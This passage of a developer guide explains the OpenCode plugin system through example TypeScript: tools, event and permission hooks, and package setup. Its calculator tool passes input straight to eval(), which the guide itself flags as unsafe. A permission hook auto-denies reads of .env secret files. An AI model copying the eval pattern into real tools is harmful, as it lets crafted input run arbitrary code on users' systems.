| `metadata` | object | No | Custom key-value pairs for organizational purposes |

**Note:** Only `name` and `description` are validated by the skill loader. Other fields are accepted but ignored at runtime. They are useful for documentation and organizational purposes.

**Global Skills:**

Place in `~/.claude/skills/` for availability across all projects:

```
~/.claude/skills/
└── debugging/
    └── SKILL.md
```

### Tools (Standalone Files)

Individual tool files as an alternative to plugin-based tools.

**Location:** `.opencode/tool/`

```typescript
// .opencode/tool/calculator.ts

import { tool } from "@opencode-ai/plugin/tool"

export default tool({
  description: "Perform mathematical calculations",
  args: {
    expression: tool.schema.string().describe("Math expression to evaluate"),
  },
  async execute(args) {
    try {
      // Safe math evaluation (in real code, use a proper math parser)
      const result = eval(args.expression)
      return `Result: ${result}`
    } catch (e) {
      return `Error: Invalid expression`
    }
  },
})
```

### Summary: Where to Put What

| Type | Location | File Format | Trigger |
|------|----------|-------------|---------|
| **Plugins** | `.opencode/plugin/` | `.ts` / `.js` | Auto-loaded |
| **Commands** | `.opencode/command/` | `.md` with frontmatter | `/command-name` |
| **Agents** | `.opencode/agent/` | `.md` with frontmatter | `@agent-name` |
| **Skills** | `.opencode/skill/*/` | `SKILL.md` | Referenced in prompts |
| **Tools** | `.opencode/tool/` | `.ts` / `.js` | Called by LLM |

### Configuration Priority

```
Lowest Priority                              Highest Priority
      │                                            │
      ▼                                            ▼
┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐
│   Remote    │  │   Global    │  │   Project   │  │ Environment │
│ .well-known │→ │ ~/.opencode │→ │  .opencode  │→ │  Variables  │
│  /opencode  │  │   /*.json   │  │   /*.json   │  │             │
└─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘
```

---

### Simple Local Plugin

For quick, project-specific plugins, create files in `.opencode/plugin/`:

```
project/
├── .opencode/
│   ├── plugin/
│   │   ├── my-tool.ts          # Custom tool plugin
│   │   ├── notifications.ts    # Event handler plugin
│   │   └── env-protection.ts   # Permission hook plugin
│   │
│   └── package.json            # Optional: external dependencies
│
└── opencode.json               # Plugin references (npm packages)
```

#### Minimal Local Plugin

```typescript
// .opencode/plugin/my-plugin.ts

import type { Plugin } from "@opencode-ai/plugin"

export const MyPlugin: Plugin = async ({ client, $, directory }) => {
  console.log(`Plugin loaded for: ${directory}`)

  return {
    // Add your hooks here
  }
}
```

#### Local Plugin with Tool

```typescript
// .opencode/plugin/custom-tool.ts

import { type Plugin, tool } from "@opencode-ai/plugin"

export const CustomToolPlugin: Plugin = async (ctx) => {
  return {
    tool: {
      greet: tool({
        description: "Greet someone by name",
        args: {
          name: tool.schema.string().describe("Name to greet"),
        },
        async execute(args) {
          return `Hello, ${args.name}!`
        },
      }),
    },
  }
}
```

#### Local Plugin with Event Handler

```typescript
// .opencode/plugin/notifications.ts

import type { Plugin } from "@opencode-ai/plugin"

export const NotificationPlugin: Plugin = async ({ $ }) => {
  return {
    event: async ({ event }) => {
      if (event.type === "session.idle") {
        // macOS notification
        await $`osascript -e 'display notification "Done!" with title "opencode"'`
      }
    },
  }
}
```

#### Local Plugin with Permission Control

```typescript
// .opencode/plugin/env-protection.ts

import type { Plugin } from "@opencode-ai/plugin"

export const EnvProtectionPlugin: Plugin = async () => {
  return {
    "permission.ask": async (info, output) => {
      // Auto-deny reading .env files
      if (info.type === "read" && info.pattern?.toString().includes(".env")) {
        output.status = "deny"
      }
    },
  }
}
```

### Full NPM Package Plugin

For distributable plugins:

```
my-opencode-plugin/
├── package.json
├── tsconfig.json
├── src/
│   ├── index.ts              # Main plugin export
│   ├── tools/
│   │   ├── index.ts          # Tool exports
│   │   ├── my-tool.ts        # Custom tool
│   │   └── another-tool.ts   # Another tool
│   ├── hooks/
│   │   ├── events.ts         # Event handlers
│   │   ├── permissions.ts    # Permission hooks
│   │   └── chat.ts           # Chat/LLM hooks
│   └── utils/
│       └── helpers.ts        # Utility functions
├── dist/                     # Compiled output
│   └── index.js
└── README.md
```

#### package.json

```json
{
  "name": "my-opencode-plugin",
  "version": "1.0.0",
  "type": "module",
  "main": "dist/index.js",
  "types": "dist/index.d.ts",
  "files": ["dist"],
  "scripts": {
    "build": "tsc",
    "prepublishOnly": "npm run build"
  },
  "dependencies": {
    "@opencode-ai/plugin": "^1.0.0"
  },
  "devDependencies": {
    "typescript": "^5.0.0",
    "@types/node": "^20.0.0"
  },
  "peerDependencies": {
    "@opencode-ai/sdk": "^1.0.0"
  }
}
```

#### tsconfig.json

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "NodeNext",
    "moduleResolution": "NodeNext",
    "declaration": true,
    "outDir": "dist",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true
  },
  "include": ["src"],
  "exclude": ["node_modules", "dist"]
}
```

#### src/index.ts (Main Entry)

```typescript
import type { Plugin, Hooks } from "@opencode-ai/plugin"
import { tools } from "./tools"
import { setupEventHandlers } from "./hooks/events"
import { setupPermissionHooks } from "./hooks/permissions"
import { setupChatHooks } from "./hooks/chat"

export const MyPlugin: Plugin = async (ctx) => {
  const hooks: Hooks = {
    // Register custom tools
    tool: tools,

    // Event handlers
    event: setupEventHandlers(ctx),

    // Permission control
    "permission.ask": setupPermissionHooks(ctx),

    // Chat/LLM modifications
    "chat.params": setupChatHooks(ctx),
  }

  return hooks
}

// Support both named and default exports
export default MyPlugin
```

#### src/tools/index.ts

```typescript
import { tool } from "@opencode-ai/plugin/tool"
import { myTool } from "./my-tool"
import { anotherTool } from "./another-tool"

export const tools = {
  my_tool: myTool,
  another_tool: anotherTool,
}
```

#### src/tools/my-tool.ts

```typescript
import { tool } from "@opencode-ai/plugin/tool"

export const myTool = tool({
  description: "Does something useful",
  args: {
    input: tool.schema.string().describe("The input to process"),
    options: tool.schema.object({
      verbose: tool.schema.boolean().optional(),
    }).optional(),
  },
  async execute(args, context) {
    const { input, options } = args
    const { sessionID, abort } = context

    // Check for abort signal
    if (abort.aborted) {
      return "Operation cancelled"
    }

    // Your tool logic here
    const result = `Processed: ${input}`

    if (options?.verbose) {
      return `[Session: ${sessionID}] ${result}`
    }

    return result
  },
})
```

#### src/hooks/events.ts

```typescript
import type { PluginInput, Hooks } from "@opencode-ai/plugin"

export function setupEventHandlers(ctx: PluginInput): Hooks["event"] {
  return async ({ event }) => {
    switch (event.type) {
      case "session.created":
        console.log(`New session: ${event.properties.id}`)
        break

      case "session.idle":
        // Session completed
        break

      case "tool.execute.after":
        // Tool finished executing
        break
    }
  }
}
```

#### src/hooks/permissions.ts

```typescript
import type { PluginInput, Hooks } from "@opencode-ai/plugin"

export function setupPermissionHooks(ctx: PluginInput): Hooks["permission.ask"] {
  return async (info, output) => {
    // Auto-allow reads from src/
    if (info.type === "read" && info.pattern?.toString().startsWith("src/")) {
      output.status = "allow"
      return
    }

    // Auto-deny writes to node_modules
    if (info.type === "edit" && info.pattern?.toString().includes("node_modules")) {
      output.status = "deny"
      return
    }

    // Everything else: ask user (default)
  }
}
```

#### src/hooks/chat.ts

```typescript
import type { PluginInput, Hooks } from "@opencode-ai/plugin"

export function setupChatHooks(ctx: PluginInput): Hooks["chat.params"] {
  return async (input, output) => {
    // Lower temperature for code generation
    if (input.agent.name === "code") {
      output.temperature = 0.3
    }

    // Add custom headers to provider options
    output.options = {
      ...output.options,
      headers: {
        ...output.options?.headers,
        "X-Plugin": "my-opencode-plugin",
      },
    }
  }
}
```

### Using External Dependencies

For local plugins that need npm packages:

```
.opencode/
├── plugin/
│   └── my-plugin.ts
└── package.json          # Dependencies for local plugins
```

#### .opencode/package.json

```json
{
  "dependencies": {
    "lodash": "^4.17.0",
    "axios": "^1.6.0",
    "zod": "^3.22.0"
  }
}
```

OpenCode automatically runs `bun install` at startup.

#### Using Dependencies in Plugin

```typescript
// .opencode/plugin/my-plugin.ts

import _ from "lodash"
import axios from "axios"
import type { Plugin } from "@opencode-ai/plugin"

export const MyPlugin: Plugin = async (ctx) => {
  return {
    tool: {
      fetch_data: {
        description: "Fetch data from API",
        args: { url: { type: "string" } },
        async execute(args) {
          const response = await axios.get(args.url)
          return _.get(response, "data.result", "No data")
        },
      },
    },
  }
}
```

### Plugin Configuration in opencode.json

```json
{
  "$schema": "https://opencode.ai/config.json",
  "plugin": [
    "my-opencode-plugin",
    "@org/private-plugin@1.2.0",
    "file:///path/to/local/plugin.js"
  ]
}
```

### Export Patterns

```typescript
// Named export (recommended for multiple plugins)
export const PluginA: Plugin = async (ctx) => ({ ... })
export const PluginB: Plugin = async (ctx) => ({ ... })

// Default export (single plugin)
export default MyPlugin

// Both (maximum compatibility)
export const MyPlugin: Plugin = async (ctx) => ({ ... })
export default MyPlugin
```

---

## 13. Community Plugins

Notable community plugins:

| Plugin | Purpose |
|--------|---------|
| `opencode-helicone-session` | Inject Helicone headers for observability |
| `opencode-type-inject` | Auto-inject TypeScript types into context |
| `opencode-wakatime` | Track usage with Wakatime |
| `oh-my-opencode` | Background agents with pre-built tools |
| `opencode-notificator` | Desktop notifications |
| `opencode-supermemory` | Persistent memory across sessions |

---

*Generated from comprehensive codebase analysis of OpenCode plugin system.*
*Last updated: January 2025*
